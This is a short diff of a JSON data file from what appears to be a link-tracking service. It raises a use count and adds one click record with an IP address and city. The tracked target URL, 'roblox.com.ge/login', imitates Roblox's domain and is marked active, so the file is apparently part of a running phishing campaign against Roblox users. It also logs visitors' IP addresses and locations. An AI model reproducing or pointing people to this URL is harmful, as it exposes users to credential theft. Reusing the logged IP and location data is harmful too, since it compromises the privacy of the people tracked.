@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1546,
+    "useCount": 1547,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12536,6 +12536,14 @@
         "city": "Kota Banjarmasin",
         "flag": "🇮🇩",
         "countryCode": "ID"
+      },
+      {
+        "timestamp": 1777449668519,
+        "ip": "103.212.119.198",
+        "country": "Mongolia",
+        "city": "Ulan Bator",
+        "flag": "🇲🇳",
+        "countryCode": "MN"
       }
     ]
   },
